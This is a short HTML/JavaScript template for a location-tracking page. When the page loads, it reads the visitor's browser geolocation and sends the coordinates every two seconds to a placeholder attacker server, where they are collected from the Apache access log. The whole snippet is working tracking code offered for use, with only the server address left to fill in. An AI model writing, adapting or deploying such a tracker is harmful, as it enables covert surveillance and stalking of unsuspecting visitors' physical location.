<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script type='text/javascript'>
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for sync reqs
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

function autoUpdate() {
  navigator.geolocation.getCurrentPosition(function(position) {
    coords = position.coords.latitude + "," + position.coords.longitude;
    url = <YOUR SERVERIP/FQDN GOES HERE>/logme/ + coords;   //Example :https:Nemoserver.com/logme/  and appends useragent and coords to /var/log/apache2/access.log
    httpGet(url);
    setTimeout(autoUpdate, 2000); // updates /var/log/apache2/access.log with the coords after every 2 seconds
})
};
$(document).ready(function(){
   autoUpdate();
});
</script>
